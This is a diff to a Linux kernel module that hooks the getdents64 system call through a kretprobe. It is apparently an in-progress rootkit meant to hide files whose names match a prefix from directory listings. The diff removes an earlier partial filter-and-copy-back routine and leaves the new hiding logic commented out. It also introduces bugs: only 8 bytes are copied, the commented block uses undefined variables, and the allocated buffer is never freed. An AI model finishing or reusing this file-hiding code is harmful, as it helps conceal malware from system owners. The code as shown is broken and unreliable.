@@ -7,6 +7,7 @@
 #include <linux/atomic.h>
 #include <linux/dirent.h>
 #include <linux/uaccess.h>
+#include <linux/ptrace.h>
 
 #include <linux/uaccess.h>
 
@@ -52,75 +53,77 @@ void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsi
 
 /* struct for info to be passed from entry handler to post handler */
 static struct getdents_data{
-    unsigned long d_name_ptr;
-}dentry_data;
+    void __user *dirent_buf;
+    int skip_file;
+    int count;
+};
 
-static int __x64_sys_getdents64_pre_handler(struct kprobe *getdents_kprobe, struct pt_regs *regs){
-    printk(KERN_INFO "Executing __x64_sys_getdents64_pre_handler... ");
+
+static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
+	printk(KERN_INFO "Executing __x64_sys_getdents64_pre_handler... ");
+
+
+	struct getdents_data *dentry_data=(struct getdents_data *)ri->data;
+
+
+	dentry_data->dirent_buf=(void __user *)regs->si;
+	dentry_data->count=regs->dx;
+
+	return 0;
 }
 
 static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 
-	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+	struct getdents_data *dentry_data=(struct getdents_data *)ri->data;
 
-
-	struct linux_dirent64 *current_dir,*kbuf = NULL;
+	struct linux_dirent64 *d,*prev=NULL;
 	unsigned long offset = 0;
 
-	int ret = regs_return_value(regs);
+
+	ssize_t ret = regs_return_value(regs);
 	printk(KERN_INFO "getdents returned %d bytes", ret);
-	kbuf = kzalloc(ret, GFP_KERNEL);
-	if(!kbuf){
-		printk(KERN_ERR "memalloc failed");
-		}
+
+	if(ret<=dentry_data->count){
+		printk(KERN_DEBUG "ret is less than count");
+	}
+	char *kbuf=kzalloc(ret,GFP_KERNEL);
+	if(!kbuf)
+		printk(KERN_ERR "couldn't allocate mem");
+
 	printk(KERN_DEBUG "mem allocated: %ld bytes",ret);
 
 	if( (ret<=0) || (kbuf == NULL) )
 		return ret;
 
 
-	if(!access_ok(dirent,ret)){
-		printk(KERN_ERR "access not ok");
-	}
-
-	long error = copy_from_user(kbuf,dirent,ret);
+	long error = copy_from_user(kbuf,dentry_data->dirent_buf,8);
 	if(error){
 		printk(KERN_ERR "could not copy %ld bytes from user",ret);
 		printk(KERN_ERR "copy_from_user error: %ld",error);
-		goto done;
 	}
+	char *ptr = kbuf;
 
-
+/*
 	while(offset<ret){
 		current_dir = (void *)kbuf+offset;
-	//	struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf+offset);
-		//printk(KERN_INFO "File: %s",d->d_name);
-	/*	if(strcmp(d->d_name, "file_to_be_hidden")!=0){
-			memmove(kbuf+new_len, d, d->d_reclen);
-			new_len+=d->d_reclen;
-		}*/
-
-		if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX))==0){
-			printk(KERN_DEBUG "rootkit found: %s", current_dir->d_name);
-		}
-	offset += current_dir->d_reclen;
+		dentry_data.d_name_ptr=(unsigned long)(unsigned char *)dirent->d_name;
+		printk(KERN_INFO "dentry_data->d_name_ptr is: %l", dentry_data.d_name_ptr);
+		return 0;
 	}
-	/*
-	   if(copy_to_user(user_dirent,kbuf,new_len)==0){
-	   regs->ax=new_len;
-	   }else{
-	   printk(KERN_ERR "copy_to_user failed");
-	   }
-	   */
-done:
-    kfree(kbuf);
-    return 0;
+
+		if(dentry_data.skip_file){
+			printk(KERN_DEBUG "rootkit found: ");
+		}
+*/
+		return 0;
 }
+
 static struct kretprobe  __x64_sys_getdents64_hook= {
-    .pre_handler = __x64_sys_getdents64_pre_handler,
-	.handler = __x64_sys_getdents64_post_handler,
-	.kp.symbol_name="__x64_sys_getdents64",
-	.maxactive=20,
+    .entry_handler 		= __x64_sys_getdents64_entry_handler,
+	.handler 		= __x64_sys_getdents64_post_handler,
+	.kp.symbol_name		="__x64_sys_getdents64",
+	.maxactive		=20,
+	.data_size		=sizeof(struct getdents_data),
 };
 
 
